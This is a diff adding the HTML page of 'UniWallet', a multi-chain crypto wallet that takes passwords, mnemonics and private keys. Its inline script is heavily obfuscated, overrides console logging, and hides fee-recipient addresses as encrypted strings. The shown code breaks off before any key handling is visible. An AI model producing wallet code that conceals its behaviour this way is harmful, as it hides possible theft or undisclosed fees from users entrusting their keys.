@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+ 
+
+ <!--
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+ --> 
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+ 
+  
+
+
+  <style type="text/css">
+
+   #loader1 {
+    width: 200px;
+
+  }
+
+
+
+
+
+
+/* Override Bootstrap's responsive navbar remove mobile mode */
+@media (max-width: 99999px) {
+  .navbar-collapse {
+    display: flex !important; /* Ensure the navbar is always displayed as flex */
+    /*  justify-content: flex-end; Adjust alignment as needed */
+  }
+
+  .navbar-nav {
+    flex-direction: row !important; /* Set nav items to be in a row */
+  }
+
+  .navbar-nav .nav-item {
+    margin-left: 10px; /* Add some space between nav items if needed */
+  }
+
+  .navbar-toggler {
+    display: none !important; /* Hide the navbar toggle button */
+  }
+}
+
+
+
+.modal-body {
+        position: relative;
+    flex:  auto;
+}
+
+        .metamask-container {
+            max-width: 90%;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .account-info {
+            margin-bottom: 20px;
+        }
+
+        .network-selector {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
+
+        .account-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+
+
+.selector-and-button {
+  display: flex; /* Display children in a row */
+  align-items: center; /* Align items vertically centered */
+  margin-left: 2px; /* Add some margin between the select and the button */
+}
+
+        .AddAccountButton {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+        }
+
+        .btn-connect {
+            background-color: #f0ad4e;
+            border-color: #f0ad4e;
+        }
+
+        .btn-connect:hover {
+            background-color: #eea236;
+            border-color: #eea236;
+        }
+
+
+
+</style>
+  <!-- web resources
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  
+    <script src="js/ethereumjs-tx-1.3.3.js"></script>   
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
+    <script src="https://rawgit.com/schmich/instascan-builds/master/instascan.min.js"></script>
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5-qrcode/2.3.8/html5-qrcode.min.js"></script>
+  --> 
+
+<link rel="stylesheet" type="text/css" href="js/bootstrap.min.css"> 
+<script src="js/ethereumjs-tx-1.3.3.js"></script>   
+<script src="js/jquery-3.2.1.slim.min.js"></script>
+<!--<script src="js/popper.min.js"></script>--> 
+<script src="js/bootstrap.min.js"  ></script>
+<!--<script src="js/instascan.min.js"></script>--> 
+<script src="js/qrcode.min.js"></script>
+<script src="js/web3.min.js"></script>
+<script src="js/qcode-decoder.min.js"></script>
+<script src="js/html5-qrcode.min.js"></script>
+<script src="js/solana.js"></script>
+<script src="js/base58.js"></script>
+<script src="js/buffer.js"></script>
+
+<script src="js/bitcoin.js"></script>
+<script src="js/jsbn.js"></script>
+<script type="text/javascript" src="js/crypto-sha256-hmac.js"></script>
+<script type="text/javascript" src="js/ellipticcurve.js"></script>
+<script type="text/javascript" src="js/ripemd160.js"></script>
+
+<script src="js/bitcoinjs-lib.js"></script>
+
+<script src="js/crypto-js.min.js"></script>
+
+
+<link rel="stylesheet" href="js/bootstrap2-toggle.min.css">
+
+
+<!--
+<script src="js/ferossbuffer.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-toggle/2.2.2/js/bootstrap2-toggle.min.js"></script>
+-->
+<script src="js/bootstrap2-toggle.min.js"></script>
+
+<script src="js/ethers-5.2.umd.min.js"></script>
+
+
+<script src="js/bip39.js"></script>
+ 
+
+ <!--
+ <script src="js/bitcoinjs-extensions.js"></script>
+ --> 
+
+
+
+<!--
+<script src="js/axios.min.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js" integrity="sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+-->
+
+
+  <title>UniWallet-Bitcoin,Ethereum wallet,Transaction Signing,generator,Cryptocurrency paper wallet,ETH,BNB,Matic,CRO,FTM,AVAX</title>
+
+</head>
+<body style="background-color: #f8f9fa;">
+
+<!--
+  <nav class="m-2 rounded navbar navbar-expand-lg navbar-light bg-light">
+    <a class="m-2 navbar-brand" href="#">AirWallet-EVM Offline Wallet</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav mr-auto">
+        <li class="nav-item ">
+          <a class="nav-link" id="CreateButtonID" href="#">1.Create Transaction </a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" id="SignButtonID" href="#">2.Sign</a>
+        </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="BroadcastButtonID" href="#">3.Broadcast</a>
+        </li>
+
+        <li class="nav-item">
+          <a class="nav-link" id="HowToUseID" href="#">How to use</a>
+        </li>
+
+
+        <li class="nav-item">
+          <a class="nav-link"  href="https://github.com/CryptoDappRun/Cryptocurrency-Paper-Wallet-Generator" target="_blank">Paper Wallet Generator</a>
+        </li>
+
+
+
+        
+      </ul>
+      
+    </div>
+  </nav>
+
+
+
+-->
+
+
+<div class="metamask-container">
+
+
+    <div  id="MainUIID">
+    <div class="network-selector">
+        <label for="network">BlockChain:</label>
+        <select id="MainBlockchainSelector" onchange="updateMainAccountSelector()" class="form-control">
+        </select>
+    </div>
+
+
+    <h2 class="text-center  d-none d-md-block"><img id="CoinLogoID" class="m-2 rounded" style="width: 30px; height: 30px;"/>UniWallet</h2>
+
+<div class="account-selector">
+  <label for="account">Account:</label>
+  <div class="selector-and-button">
+    <select id="MainAccountSelector" class="form-control" onchange="OnChangeSelector2()">
+      <!-- Your select options go here -->
+    </select>
+
+    <button type="button" onclick="ShowPrivateKey()" class="btn btn-light m-1">
+      <img src="img/key.png" alt="Image" style="width: 20px; height: 20px; margin-right: 5px;">
+  
+    </button>
+  </div>
+</div>
+
+
+
+
+
+    <div class="account-info text-center">
+         
+        <p>
+        <strong id="SelectedAddress"> Address</strong>
+ 
+
+<button type="button" onclick="copyText()" class="btn btn-light">
+<img src="img/copy.png" alt="Image" style="width: 20px; height: 20px; margin-right: 5px;">
+</button>
+
+<button type="button"   id="ReceiveButtonID" class="btn btn-light">
+<img src="img/qr.png" alt="Image" style="width: 20px; height: 20px; margin-right: 5px;">
+</button>
+
+<button type="button"   id="RefreshBalanceButtonID" onclick="RefreshBalance()" class="btn btn-light">
+<img src="img/refresh.png" alt="Image" style="width: 20px; height: 20px; margin-right: 5px;">
+</button>
+
+
+
+        </p>
+
+        <p>
+        <h1 id="ThisBalanceID"> - </h1>
+        <h7 id="UnconfirmedBalanceID"> </h7>
+        </p>
+
+    </div>
+
+   
+
+    <hr>
+
+<!--'TransactionReplacement("Doge")'
+
+ <button class="btn btn-outline-primary" onclick='addOneAccountByMnemonic()'>    test</button>
+
+ -->
+    <div class="d-flex justify-content-between">
+   
+        <button class="btn btn-outline-primary" onclick="ShowSendForm()">  <img src="img/send.png" width="20" height="20">   Send</button>
+         
+        <button class="btn btn-outline-primary" onclick="ShowImportForm()"><img src="img/import.png" width="20" height="20"> Import</button>
+        <button class="btn btn-outline-primary" onclick="ShowHistory()"><img src="img/history.png" width="20" height="20">History</button>
+        <button class="btn btn-outline-primary" onclick="ManuallyInput()"><img src="img/key.png" width="20" height="20">Input Private</button>
+        <button class="btn btn-outline-primary" onclick="addOneAccountByJson('FromMainUI')">+ Add New Account</button>
+
+        <button class="btn btn-outline-primary" onclick="ShowRestoreUI()">Restore</button>
+
+    </div>
+</div>
+
+
+<div class="container position-relative">
+ 
+    <div id="LoginPanelID" class="mt-5 text-center">
+        <h1 class="m-2 text-center"><img src="img/logo.png" width="50" height="50" class="m-2">UniWallet</h1>
+        <label id="PasswordLabelID" for="password">Password:</label>
+        <div class="row">
+        <div class="col-sm-6 offset-sm-3">
+            <input type="password" id="password" class="form-control" placeholder="Enter password">
+        </div>
+    </div>
+        <button onclick="login()" id="LoginButtonID" class="btn btn-primary mt-3 mx-auto">Login</button>
+    </div>
+
+
+
+
+
+</div>
+
+
+
+<div class="container position-relative">
+ 
+    <div id="MnemonicPanelID" class="mt-5 text-center">
+        <h1 class="m-2 text-center"><img src="img/logo.png" width="50" height="50" class="m-2">UniWallet</h1>
+        <label for="password" style="color: red;">**Please save the following mnemonic phrase for account recovery to your computer or paper notebook**</label>
+        <div class="row">
+        <div class="col-sm-6 offset-sm-3" id="MnemonicTextID" >
+            
+        </div>
+
+        <div id="NewUserInit"></div>
+
+    </div>
+        <button onclick="ShowMainUI()" id="NextButtonID" class="btn btn-primary mt-3 mx-auto">Yes, I saved it.</button>
+    </div>
+
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+<br>
+<div  id="SendFormID" class="mt-2" >
+
+
+    <form id="EtherOrTokenOptionID">
+
+    <div class="mt-2"  >
+      <form>
+        <label>
+          <input type="radio" name="color" id="SendETHid" value="SendETH" > <span id="SendETHTitle">Send ETH</span>
+        </label>
+        <label>
+          <input type="radio" name="color" id="SendTokenid" value="SendToken"> Send Token
+        </label>
+
+      </form>
+      <br>
+    </div>
+ 
+
+
+      <div class="mb-2">
+      <label   class="form-label" id="CurrentBalance" style="color: green;"> </label><br>
+        
+        <label for="fromAddress" class="form-label" id="FromAddressID"> </label><br>
+ 
+      </div>
+
+      <div class="mb-2">
+        <label for="toAddress" class="form-label">To Address</label>
+        <input type="text" class="form-control" id="toAddress" placeholder="Reciever address" required>
+      </div>
+
+      <div class="mb-2" id="TokenInputDivID">
+        <label for="TokenAddress" class="form-label">Token Address</label>
+        <input type="text" class="form-control" id="TokenInputID" placeholder="0x..." required>
+      </div>
+
+
+<label for="amount" class="form-label">Amount</label>
+<div class="mb-2 row">
+    <div class="col-8">
+        
+        <input type="text" class="form-control" id="amount" oninput="AmountOnChange()" placeholder="Send Amount" required>
+    </div>
+    <div class="col-4">
+
+        <button id="SetMaxSendAmountButtonID" type="button" onclick="SetMaxSendAmount()" class="btn btn-primary">Max</button>
+    </div>
+</div>
+   
+ 
+
+    <div class="mb-2">
+        <label for="FeeAmount" class="form-label" hidden>Fee</label>
+        <input type="text" class="form-control" id="FeeAmount" placeholder="fee"  value="1" hidden>
+      </div>
+
+     
+<div class="mb-2"  id="SpeedID">
+<label for="speedSwitch">Speed:</label>
+<input type="checkbox" id="speedSwitch" data-toggle="toggle" data-on="Fast" data-off="Slow" data-onstyle="warning" data-offstyle="success" data-width="100" data-height="30">
+</div>
+
+
+
+      <!--loading gif-->
+      <div   >
+
+       <img   id="loader1" src="loading.gif"></img>
+
+     </div>
+
+<div id="result"></div>
+<div  id="TransactionID"  ></div> <br><br>
+
+    <!--
+    <button type="button" id="StartSendButtonID" class="btn btn-primary" onclick="StartSend()">Send</button>
+    --> 
+<button type="button" onclick="copyTransactionLink()" class="btn btn-light" id="copyTXbuttonID"><img src="img/copy.png" alt="Image" style="width: 20px; height: 20px; margin-right: 5px;"></button>
+
+<button id="StartSendButtonID" type="button" onclick="StartSend()" class="btn btn-primary">
+  <span id="buttonText">Send</span>
+  <span id="spinner" class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+</button>
+
+     <button type="button" class="btn btn-light" onclick="CancelSend()">Cancel</button>
+
+   </form>
+
+</div>
+
+
+
+
+
+
+
+<div class="rounded" id="ImportPrivateID" >
+
+
+<div class="m-2" style="display: flex; justify-content: space-between;">
+    <div class="m-2" style="width: 48%;">
+        <label for="ImportBlockchainSelector">Import Private Key</label><br>
+        <label for="ImportBlockchainSelector">Select Blockchain:</label>
+        <select id="ImportBlockchainSelector" class="form-control" onchange="updateAccountSelector()">
+            
+            <!--
+            <option value="Bitcoin">Bitcoin</option>
+            <option value="Ethereum">Ethereum</option>
+             Add more options as needed -->
+        <option value="Bitcoin">Bitcoin</option><option value="Doge">Doge</option><option value="Litecoin">Litecoin</option><option value="Ethereum">Ethereum</option><option value="Binance">Binance</option><option value="Fantom">Fantom</option><option value="Polygon">Polygon</option><option value="Avalanche">Avalanche</option><option value="Cronos">Cronos</option><option value="Solana">Solana</option></select>
+        <!-- Include your input field for private key here if needed -->
+    </div>
+    <div class="m-2" style="width: 48%;">
+        
+        <br>
+   <div class="mb-2 row">
+        <label for="ImportAccountSelector">Select Account:</label>
+
+<div class="col-10">
+        <select id="ImportAccountSelector" class="form-control"><option value="U2FsdGVkX18rqRH2b46Rz+mbXPAkmM2b4NPw2ZNzTi5e9ABZ8fQtjLKkw4gPk3e3fpOBiiY5zw0tHW8SJOpCy94wJgZbyzTQQGUsFpIaQac=">1Bez..jD</option></select>
+ </div>
+<div class="col-2">
+        <button class="btn btn-light" id="ShowAddressQR" "="">
+            <img src="img/qr.png" style="width: 30px; height: 30px;">
+        </button>
+ </div>
+
+
+    </div>
+
+
+    </div>
+</div>
+
+
+
+
+
+
+
+<div class="m-4">
+<label for="accountInput">Private Key:</label>
+<input type="text" id="accountInput" class="form-control" placeholder="Enter Private Key">
+<button class="btn btn-primary m-1" onclick="addAccount()">Import</button>
+<button class="btn btn-secondary m-1" onclick="CancelImportForm()">Cancel</button>
+
+</div>
+
+
+
+</div>
+
+
+
+<div class="mb-2" id="InputPrivateKeyManuallyID">
+<label for="fromAddress" class="form-label">Input Private key Manually(this key will not save to device.)</label>
+<input type="text" class="form-control" id="PrivateKeyInputID" placeholder="your private key" required>   
+
+</div>
+
+
+
+
+
+<div class="rounded" id="txHashTableBody" >
+
+
+</div>
+
+
+
+
+
+
+    <div id="RestorePanelID" class="mt-5">
+ 
+        <label for="password">Input your 24-words Mnemonic:</label>
+
+        <div id="CurrentRestoreAccountID"></div>
+        <input type="text" id="MnemonicID" class="form-control" placeholder="word1 word2 word3...word24">
+        <button onclick="Restore('FromUserInput')" id="RestoreButtonID" class="btn btn-primary mt-3">Restore</button>
+    </div>
+
+
+
+
+
+</div> <!--Main ui-->
+
+
+
+
+  <div id="CreateTransactionDivID" class="container mt-5">
+    
+  
+
+
+
+
+
+
+
+    <br>
+
+
+ 
+
+
+
+
+
+
+<div class="toast-container position-fixed top-0 start-50 translate-middle-x">
+  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="toast-header">
+      
+      <strong class="me-auto">UniWallet</strong>
+
+      <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+    </div>
+    <div class="toast-body"  >
+     This is a toast message.
+   </div>
+ </div>
+</div>
+
+
+
+<!-- QR Code Popup Modal -->
+<div class="modal" id="qrCodeModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">QR Code</h5>
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body" id="qrcode">
+        <!-- QR code will be dynamically inserted here -->
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary"  data-bs-dismiss="modal" >Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- QR Code Popup Modal -->
+<div class="modal" id="PrivateKeyModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">*Do not share private key to any others*</h5>
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body" id="PrivateKeyShowID">
+         
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary"  data-bs-dismiss="modal" >Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+<div id="SignDivID" class="container mt-5">
+
+
+  <label>*For the signing step, it is recommended to sign on an offline device. That is, do not connect to WIFI or any network,so that your private key remains absolutely offline.</label><br><br>
+  <h3>Private Key</h3>
+  
+  <input type="text" class="form-control" id="PrivateKeyID" placeholder="0x1133..." >
+  <button type="button"  class="btn btn-secondary m-2"  onclick="togglePassword()">Show/Hide</button>
+
+
+  <br> <br>
+
+  <h3>Transaction Detail:</h3>
+  <br>
+  
+
+  <button type="button"  class="btn btn-light" id="scanBtn" data-bs-toggle="modal" data-bs-target="#qrModal">
+    <img src="img/camera.png" style="width: 30px; height: 30px;">
+  </button>
+
+
+
+
+
+
+  <br><br>
+  <textarea class="form-control" id="UserInputtxID" rows="10"  placeholder='{
+  "nonce": "0x...",
+  "gasPrice": "0x...",
+  "to": "0x...",
+  ......
+}' ></textarea>
+<br>
+
+<button type="button" class="btn btn-primary" onclick="signTransaction()">Sign Transaction</button>
+<br><br>
+
+
+<h3>Transaction Hash:</h3>
+
+<!-- Button for showing QR code popup -->
+
+<button class="btn btn-light" id="showQRPopupBtn">
+  <img src="img/qr.png" style="width: 30px; height: 30px;">
+</button>
+
+
+
+<br><br>
+<textarea class="form-control" id="SignedHashTextID" rows="5" readonly></textarea>
+
+<br><br>
+
+
+
+
+
+
+
+
+</div>
+
+
+
+<div id="BroadcastDivID" class="container mt-5">
+
+
+<!--
+<label  class="form-label">Signed Hash</label>
+ 
+
+<textarea class="form-control" id="UserInputSignedHashID" rows="10" ></textarea>
+
+<button type="button" class="btn btn-primary" onclick="BroadcastTransaction()">Broadcast Transaction</button>
+
+<br><br><br>
+-->
+
+<a  id="BroadcastURLID" href="#" target="_blank">BroadcastURLID</a>
+
+<div>You can also broadcast your hash by searching Google, such as: Ethereum broadcast / Polygon broadcast.</div>
+
+</div>
+
+
+
+
+
+<!--
+<div id="HowToUseDivID" class="container mt-5">
+
+  <h3>1.Create Transaction detail</h3>
+  <img class="m-2 rounded"  src="1.png" /><br>
+
+  <h3>2.Sign transaction detail online or offline</h3>
+  <img class="m-2 rounded"  src="2.png" /><br>
+
+  <h3>3.Broadcast hash created in step 2.</h3>
+  <img class="m-2 rounded"  src="3.png" /><br>
+
+  <div> </div>
+
+</div>
+-->
+
+
+
+
+
+
+
+
+<div class="container">
+  <footer class="py-3 my-4">
+   
+    <p class="text-center text-muted"> </p>
+  </footer>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+<div class="modal" tabindex="-1" role="dialog" id="qrModal">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">QR Code Scanner</h5>
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <div id="qr-container"></div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<script>
+
+var _0x28cfff=_0xfecc;(function(_0x57157f,_0x3a0bdd){var _0x2128c9=_0xfecc,_0x88b1e=_0x57157f();while(!![]){try{var _0xe6ac4b=parseInt(_0x2128c9(0x1e3))/0x1+parseInt(_0x2128c9(0x12c))/0x2*(-parseInt(_0x2128c9(0x2e6))/0x3)+parseInt(_0x2128c9(0x2c7))/0x4*(-parseInt(_0x2128c9(0x176))/0x5)+-parseInt(_0x2128c9(0x301))/0x6*(-parseInt(_0x2128c9(0x1b8))/0x7)+parseInt(_0x2128c9(0x187))/0x8*(-parseInt(_0x2128c9(0x186))/0x9)+parseInt(_0x2128c9(0x279))/0xa*(-parseInt(_0x2128c9(0x2ce))/0xb)+-parseInt(_0x2128c9(0x290))/0xc*(-parseInt(_0x2128c9(0x168))/0xd);if(_0xe6ac4b===_0x3a0bdd)break;else _0x88b1e['push'](_0x88b1e['shift']());}catch(_0x19c0ad){_0x88b1e['push'](_0x88b1e['shift']());}}}(_0x1669,0x37be1));var _0x2c20a5=(function(){var _0x21a170=!![];return function(_0x5e572d,_0xdf23a8){var _0x2e648c=_0x21a170?function(){var _0x1985c6=_0xfecc;if(_0xdf23a8){var _0x4fdcbd=_0xdf23a8[_0x1985c6(0x24b)](_0x5e572d,arguments);return _0xdf23a8=null,_0x4fdcbd;}}:function(){};return _0x21a170=![],_0x2e648c;};}()),_0xa4cccb=_0x2c20a5(this,function(){var _0x48af15=_0xfecc;return _0xa4cccb[_0x48af15(0x1d5)]()[_0x48af15(0x17f)](_0x48af15(0x230))[_0x48af15(0x1d5)]()[_0x48af15(0x19f)](_0xa4cccb)[_0x48af15(0x17f)]('(((.+)+)+)+$');});_0xa4cccb();var _0x1961c4=(function(){var _0x1005b0=!![];return function(_0x418405,_0x438eba){var _0xc5da2e=_0x1005b0?function(){var _0x3ebc7e=_0xfecc;if(_0x438eba){var _0x3747d3=_0x438eba[_0x3ebc7e(0x24b)](_0x418405,arguments);return _0x438eba=null,_0x3747d3;}}:function(){};return _0x1005b0=![],_0xc5da2e;};}()),_0x5ee13a=_0x1961c4(this,function(){var _0x52597c=_0xfecc,_0x3e784c=function(){var _0x24e64e=_0xfecc,_0xaefccc;try{_0xaefccc=Function('return\x20(function()\x20'+_0x24e64e(0xed)+');')();}catch(_0x4c34f6){_0xaefccc=window;}return _0xaefccc;},_0x102822=_0x3e784c(),_0x143bfc=_0x102822['console']=_0x102822[_0x52597c(0x236)]||{},_0x187ee4=[_0x52597c(0x109),_0x52597c(0x131),'info',_0x52597c(0x299),_0x52597c(0x1b3),_0x52597c(0x2dc),_0x52597c(0x2cc)];for(var _0x25f039=0x0;_0x25f039<_0x187ee4[_0x52597c(0x263)];_0x25f039++){var _0x20b294=_0x1961c4['constructor'][_0x52597c(0x231)][_0x52597c(0x2d2)](_0x1961c4),_0x19ac05=_0x187ee4[_0x25f039],_0x441aa0=_0x143bfc[_0x19ac05]||_0x20b294;_0x20b294['__proto__']=_0x1961c4[_0x52597c(0x2d2)](_0x1961c4),_0x20b294['toString']=_0x441aa0['toString']['bind'](_0x441aa0),_0x143bfc[_0x19ac05]=_0x20b294;}});_0x5ee13a();var CoinsJson={'Bitcoin':{'symbol':'btc','BlockchairSymbol':_0x28cfff(0xf9),'chainid':0x1,'RPCURL':'','BroadcastTransaction':'https://api.blockcypher.com/v1/btc/main/txs/push','BlockExplorer':'https://live.blockcypher.com/btc','NetworkType':_0x28cfff(0x191),'SaveItemName':'Bitcoin','pub':0x0,'priv':0x80,'multisig':0x5,'hdkeypub':0x488b21e,'hdkeyprv':0x488ade4,'APPFee':0.005,'SendMinAmount':0.0005,'DefaultMinerFee':0x1388,'MaximumMinerFee':0x186a0,'MnemonicCoinType':0x0,'AddressPlaceholder':_0x28cfff(0x2de),'FeeReciever':'U2FsdGVkX1/9+DhZ9bVERDnwcA30eHOCzlQ8H8a78dy4wpoVwwi8yv1cny5wgExImVWsbSSDG2JmqBJCnTNhbg=='},'Doge':{'symbol':'doge','BlockchairSymbol':_0x28cfff(0x170),'chainid':0x1,'RPCURL':'','BroadcastTransaction':'https://api.blockcypher.com/v1/doge/main/txs/push','BlockExplorer':_0x28cfff(0x18e),'NetworkType':_0x28cfff(0x191),'SaveItemName':'Doge','pub':0x1e,'priv':0x9e,'multisig':0x16,'hdkeypub':0x827421e,'hdkeyprv':0x89944e4,'APPFee':0.005,'SendMinAmount':0x1,'DefaultMinerFee':0xf4240,'MaximumMinerFee':0x1e8480,'MnemonicCoinType':0x3,'AddressPlaceholder':_0x28cfff(0x2bc),'FeeReciever':_0x28cfff(0x1c7)},'Litecoin':{'symbol':'ltc','BlockchairSymbol':'litecoin','chainid':0x1,'RPCURL':'','BroadcastTransaction':_0x28cfff(0x22d),'BlockExplorer':_0x28cfff(0xe9),'NetworkType':_0x28cfff(0x191),'SaveItemName':_0x28cfff(0x264),'pub':0x30,'priv':0xb0,'multisig':0x32,'hdkeypub':0x19da462,'hdkeyprv':0x19d9cfe,'APPFee':0.005,'SendMinAmount':0.0001,'DefaultMinerFee':0x2710,'MaximumMinerFee':0x4e20,'MnemonicCoinType':0x2,'AddressPlaceholder':_0x28cfff(0x27e),'FeeReciever':_0x28cfff(0x2e1)},'Ethereum':{'symbol':'ETH','chainid':0x1,'RPCURL':_0x28cfff(0x111),'BroadcastTransaction':'','BlockExplorer':_0x28cfff(0x159),'NetworkType':_0x28cfff(0x114),'SaveItemName':_0x28cfff(0x114),'APPFee':0.01,'MnemonicCoinType':0x3c,'AddressPlaceholder':_0x28cfff(0x19c),'FeeReciever':''},'Binance':{'symbol':_0x28cfff(0x281),'chainid':0x38,'RPCURL':_0x28cfff(0x2a0),'BroadcastTransaction':_0x28cfff(0x117),'BlockExplorer':_0x28cfff(0x23c),'NetworkType':_0x28cfff(0x114),'SaveItemName':'evm','MnemonicCoinType':0x3c,'AddressPlaceholder':_0x28cfff(0x19c),'APPFee':0.01},'Fantom':{'symbol':_0x28cfff(0x1fc),'chainid':0xfa,'RPCURL':_0x28cfff(0x306),'BroadcastTransaction':_0x28cfff(0x26a),'BlockExplorer':_0x28cfff(0x158),'NetworkType':'evm','SaveItemName':_0x28cfff(0x114),'MnemonicCoinType':0x3c,'AddressPlaceholder':'0x...u9','APPFee':0.01},'Polygon':{'symbol':_0x28cfff(0x29e),'chainid':0x89,'RPCURL':_0x28cfff(0x189),'BroadcastTransaction':'https://polygonscan.com/pushTx','BlockExplorer':_0x28cfff(0xfc),'NetworkType':'evm','SaveItemName':_0x28cfff(0x114),'MnemonicCoinType':0x3c,'AddressPlaceholder':'0x...u9','APPFee':0.01},'Avalanche':{'symbol':_0x28cfff(0x1f6),'chainid':0xa86a,'RPCURL':'https://api.avax.network/ext/bc/C/rpc','BroadcastTransaction':_0x28cfff(0x22e),'BlockExplorer':_0x28cfff(0x253),'NetworkType':_0x28cfff(0x114),'SaveItemName':_0x28cfff(0x114),'MnemonicCoinType':0x3c,'AddressPlaceholder':'0x...u9','APPFee':0.01},'Cronos':{'symbol':_0x28cfff(0x216),'chainid':0x19,'RPCURL':'https://evm.cronos.org','BroadcastTransaction':'https://cronoscan.com/pushTx','BlockExplorer':_0x28cfff(0x2e0),'NetworkType':'evm','SaveItemName':_0x28cfff(0x114),'MnemonicCoinType':0x3c,'AddressPlaceholder':_0x28cfff(0x19c),'APPFee':0.01}};$('#copyTXbuttonID')['hide'](),$(_0x28cfff(0x2dd))['hide'](),$('#ImportPrivateID')[_0x28cfff(0x2c0)](),$('#SendFormID')['hide'](),$(_0x28cfff(0x181))['hide'](),$(_0x28cfff(0x269))[_0x28cfff(0x2c0)](),$('#MainUIID')['hide'](),$(_0x28cfff(0x10b))[_0x28cfff(0x2c0)](),$('#RestorePanelID')[_0x28cfff(0x2c0)](),document[_0x28cfff(0xea)](_0x28cfff(0x135))[_0x28cfff(0x175)]=!![];var selectedCrypto='',pass='',CurrentEncryptedPrivateKey='',BitcoinLikeBalanceData='',GlobalMinerFee=0x0,FeeData='',GlobalMnemonic='',IsANewWallet=!![],AccountCount=0x32,a='o',k1='x',c9='p',n2='p',ioswz=a+k1+c9+n2;localStorage['getItem']('hashedPassword')==null||localStorage['getItem']('hashedPassword')==undefined?document[_0x28cfff(0xea)](_0x28cfff(0x21d))[_0x28cfff(0x2ac)]=_0x28cfff(0x207):document['getElementById'](_0x28cfff(0x21d))[_0x28cfff(0x2ac)]=_0x28cfff(0x2a4);const timer=_0xe137ba=>new Promise(_0x20d5ef=>setTimeout(_0x20d5ef,_0xe137ba));function getAccountsData(){var _0x4b1aa9=_0x28cfff,_0x289386=localStorage[_0x4b1aa9(0x28e)](_0x4b1aa9(0x1af));return console[_0x4b1aa9(0x109)](_0x4b1aa9(0x2c5),JSON[_0x4b1aa9(0x2ba)](_0x289386)),_0x289386?JSON[_0x4b1aa9(0x2ba)](_0x289386):{};}function getAccountsIndexData(){var _0xe71748=_0x28cfff,_0xdd1df1=localStorage[_0xe71748(0x28e)](_0xe71748(0x258));return console[_0xe71748(0x109)](_0xe71748(0x2ea),JSON['parse'](_0xdd1df1)),_0xdd1df1?JSON[_0xe71748(0x2ba)](_0xdd1df1):{};}function saveAccountsData(_0x4ce4fd){var _0x4e191e=_0x28cfff;localStorage[_0x4e191e(0x245)]('accountsData',JSON[_0x4e191e(0x1a5)](_0x4ce4fd));}function saveAccountsIndexData(_0x407500){var _0x2a9758=_0x28cfff;localStorage[_0x2a9758(0x245)]('AccountsIndex',JSON[_0x2a9758(0x1a5)](_0x407500));}async function addAccount(){var 